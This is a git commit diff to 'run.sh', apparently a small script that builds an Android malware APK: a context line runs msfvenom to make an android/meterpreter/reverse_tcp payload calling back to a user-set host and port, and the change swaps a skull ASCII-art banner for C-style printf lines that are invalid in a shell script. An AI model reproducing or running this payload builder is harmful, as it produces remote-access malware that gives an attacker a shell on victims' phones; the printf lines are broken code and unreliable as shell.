20c54dde952fbbc79de22e5d9b3c8f82c0e34880
omarfares123 <67717483+omarfares123@users.noreply.github.com>
2021-03-23 07:39:34 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -11,29 +11,29 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> $name.apk
 echo "know U have Your apk"
 echo "Have a nice day"
 ls
-         _,.-------.,_
-     ,;~'             '~;,
-   ,;                     ;,
-  ;                         ;
- ,'                         ',
-,;                           ;,
-; ;      .           .      ; ;
-| ;   ______       ______   ; |
-|  `/~"     ~" . "~     "~\'  |
-|  ~  ,-~~~^~, | ,~^~~~-,  ~  |
- |   |        }:{        |   |
- |   l       / | \       !   |
- .~  (__,.--" .^. "--.,__)  ~.
- |     ---;' / | \ `;---     |
-  \__.       \/^\/       .__/
-   V| \                 / |V
-    | |T~\___!___!___/~T| |
-    | |`IIII_I_I_I_IIII'| |
-    |  \,III I I I III,/  |
-     \   `~~~~~~~~~~'    /
-       \   .       .   /
-         \.    ^    ./
-           ^~~~^~~~^
+printf("         _,.-------.,_");
+printf("     ,;~'             '~;,");
+printf("   ,;                     ;,");
+printf("  ;                         ;");
+printf(" ,'                         ',");
+printf(",;                           ;,");
+printf("; ;      .           .      ; ;");
+printf("| ;   ______       ______   ; |");
+printf("|  `/~"     ~" . "~     "~\'  |");
+printf("|  ~  ,-~~~^~, | ,~^~~~-,  ~  |");
+printf(" |   |        }:{        |   |");
+printf(" |   l       / | \       !   |");
+printf(" .~  (__,.--" .^. "--.,__)  ~.");
+printf(" |     ---;' / | \ `;---     |");
+printf("  \__.       \/^\/       .__/");
+printf("   V| \                 / |V");
+printf("    | |T~\___!___!___/~T| |");
+printf("    | |`IIII_I_I_I_IIII'| |");
+printf("    |  \,III I I I III,/  |");
+printf("     \   `~~~~~~~~~~'    /");
+printf("       \   .       .   /");
+printf("         \.    ^    ./");
+printf("           ^~~~^~~~^");
 
 
 
